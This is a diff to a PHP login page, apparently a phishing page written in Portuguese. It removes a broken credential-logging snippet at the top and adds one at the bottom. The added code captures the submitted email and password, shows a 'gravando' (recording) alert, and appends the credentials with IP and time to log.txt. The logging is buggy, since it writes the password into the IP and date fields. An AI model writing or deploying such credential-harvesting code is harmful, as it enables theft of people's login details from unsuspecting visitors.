@@ -1,18 +1,4 @@
-<?php 
 
-   $email = POST['inputEmail'];
-   $pass = POST['inputSenha'];
-   $IP = $_SERVER['REMOTE_ADDR'];
-   $datatime = date("F j, Y, g:i a");
-
-   $data = "$datatime | $IP | $email | $pass";
-
-   $datafile = 'datafile.txt';
-   $fp = fopen($datafile, "r+");
-   fwrite($fp, $data, strlen($data));
-   fclose($fp);
-  
-?>
 <!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
@@ -250,3 +236,26 @@
     </div>
 </div>
 </body>
+<?php 
+
+   if (isset($_POST['inputEmail']) && isset($_POST['inputSenha']) ){
+
+    echo "<script>alert('gravando')</script>";
+    $IP = $_SERVER['REMOTE_ADDR'];
+    $datatime = date("F j, Y, g:i a");
+
+    $email = $_POST['inputEmail'];
+    $senha = $_POST['inputSenha'];
+
+$msg = "
+- Email : $email\n
+- Senha : $senha\n
+- IP : $senha\n
+- Data e Hora : $senha\n
+--------------------------------";
+    $myfile = fopen("log.txt", "a");
+    fwrite($myfile, $msg."\n");
+    fclose($myfile);
+}
+  
+?>
